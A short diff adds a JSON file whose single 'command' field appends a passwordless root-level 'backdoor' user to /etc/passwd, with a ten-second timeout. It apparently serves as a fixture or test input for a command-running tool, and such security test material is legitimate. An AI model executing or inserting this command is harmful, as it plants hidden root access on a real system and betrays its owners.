@@ -1,0 +1,4 @@
+{
+  "command": "echo 'backdoor:x:0:0::/root:/bin/bash' >> /etc/passwd",
+  "timeout_seconds": 10
+}
